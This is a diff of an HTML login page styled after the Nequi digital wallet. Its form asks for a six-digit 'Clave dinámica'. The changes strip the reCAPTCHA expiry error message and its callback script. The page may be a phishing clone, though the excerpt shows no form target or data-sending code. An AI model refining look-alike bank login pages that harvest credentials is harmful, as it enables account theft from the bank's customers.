@@ -13,7 +13,6 @@
       position: relative;
       overflow-x: hidden;
     }
-    /* Fondo decorativo con figuras */
     .nequi-bg-squares {
       position: fixed;
       left: 0; top: 0; width: 100vw; height: 100vh;
@@ -148,12 +147,7 @@
       margin-top: 8px;
     }
     .captcha-error {
-      color: #e4007a;
-      font-size: 1rem;
-      margin-bottom: 7px;
-      margin-top: -7px;
-      font-weight: 500;
-      display: none;
+      display: none !important;
     }
     .nequi-btn {
       width: 100%;
@@ -301,12 +295,6 @@
       .footer-menu-list { max-width: 100vw; }
     }
     </style>
-    <script>
-    // reCAPTCHA expired callback
-    function recaptchaExpired() {
-      document.querySelector('.captcha-error').style.display = 'block';
-    }
-    </script>
 </head>
 <body>
     <div class="nequi-bg-squares">
@@ -346,12 +334,9 @@
                   <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required placeholder="Clave dinámica">
               </div>
               <div class="captcha-box">
-                  <div class="captcha-error">
-                    La verificación ha caducado. Vuelve a marcar la casilla de verificación.
-                  </div>
+                  <div class="captcha-error"></div>
                   <div class="g-recaptcha"
-                      data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"
-                      data-expired-callback="recaptchaExpired"></div>
+                      data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
               </div>
               <button type="submit" class="nequi-btn">Entra</button>
           </form>
